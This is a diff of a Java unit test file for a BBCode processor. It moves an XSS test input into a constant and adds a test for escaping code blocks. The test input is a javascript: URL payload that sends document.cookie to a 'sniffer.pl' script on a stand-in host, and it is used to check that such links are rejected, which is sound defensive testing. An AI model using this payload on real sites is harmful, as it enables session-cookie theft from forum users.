@@ -12,6 +12,8 @@ public class BBCodeTest {
   private static final String TAG_ESCAPE_TEST = "<br>";
   private static final String TAG_ESCAPE_RESULT = "&lt;br&gt;";
 
+  private static final String JAVASCRIPT_URL = "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]";
+
   @Test
   public void testLineBreak() throws BadURLException {
     BBCodeProcessor proc = new BBCodeProcessor();
@@ -34,6 +36,15 @@ public class BBCodeTest {
   public void testJavascriptURL() throws BadURLException {
     BBCodeProcessor proc = new BBCodeProcessor();
 
-    proc.preparePostText("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]");
+    proc.preparePostText(JAVASCRIPT_URL);
+  }
+
+  @Test
+  public void testCodeExcape() throws BadURLException {
+    BBCodeProcessor proc = new BBCodeProcessor();
+
+    String result = proc.preparePostText("[code]\"code&code\"[/code]");
+
+    assertEquals("<div class=\"code\">&quot;code&amp;code&quot;</div>", result);
   }
 }
